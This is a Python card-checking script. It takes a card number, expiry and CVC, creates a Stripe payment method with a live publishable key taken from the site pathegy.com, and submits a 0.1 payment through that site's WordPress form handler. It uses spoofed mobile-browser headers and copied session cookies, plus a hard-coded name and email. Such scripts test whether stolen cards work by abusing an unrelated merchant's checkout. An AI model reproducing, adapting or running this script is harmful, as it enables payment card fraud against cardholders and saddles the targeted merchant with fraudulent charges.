import requests

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    # Fix year if it contains '20'
    if "20" in yy:
        yy = yy.split("20")[1]

    # Start a session
    r = requests.session()

    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F81cb80e68b%3B+stripe-js-v3%2F81cb80e68b%3B+card-element&referrer=https%3A%2F%2Fpathegy.com&time_on_page=50726&key=pk_live_51GfMdBFq1rSX42ptD3Yyv9LjLezGcpEmZn3QsEGfWCVlk4b522LYdWBLqU1KK90x4jN3r9Aq0EI4oL02rxUg97YB00YOLR6i8p'

    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    pm= r1.json().get('id')

    cookies = {
    'pys_session_limit': 'true',
    'pys_start_session': 'true',
    'pys_first_visit': 'true',
    'pysTrafficSource': 'google.com',
    'pys_landing_page': 'https://pathegy.com/business-basic/',
    'last_pysTrafficSource': 'google.com',
    'last_pys_landing_page': 'https://pathegy.com/business-basic/',
    '_fbp': 'fb.1.1734808537592.9813735899',
    '__stripe_mid': '398c07ee-0bfe-4628-a0a8-fc6c5bc2e0c599251d',
    '__stripe_sid': 'c69ad71c-9769-4edf-b91f-153cf86e7160448767',
}

    headers = {
    'authority': 'pathegy.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=google.com; pys_landing_page=https://pathegy.com/business-basic/; last_pysTrafficSource=google.com; last_pys_landing_page=https://pathegy.com/business-basic/; _fbp=fb.1.1734808537592.9813735899; __stripe_mid=398c07ee-0bfe-4628-a0a8-fc6c5bc2e0c599251d; __stripe_sid=c69ad71c-9769-4edf-b91f-153cf86e7160448767',
    'origin': 'https://pathegy.com',
    'referer': 'https://pathegy.com/business-basic/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    't': '1734808589338',
}

    data = {
    'data': '__fluent_form_embded_post_id=50660&_fluentform_10_fluentformnonce=f8ed1e3cf3&_wp_http_referer=%2Fbusiness-basic%2F&names%5Bfirst_name%5D=waznim&names%5Blast_name%5D=ey&numeric-field=2095455155&email=waznimey%40gmail.com&input_text=Future&input_text_1=10080&payment_input=0.1&payment-coupon=&payment_method_1=stripe&__ff_all_applied_coupons=&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '10',
}

    r2 = requests.post('https://pathegy.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)

    return r2.json()
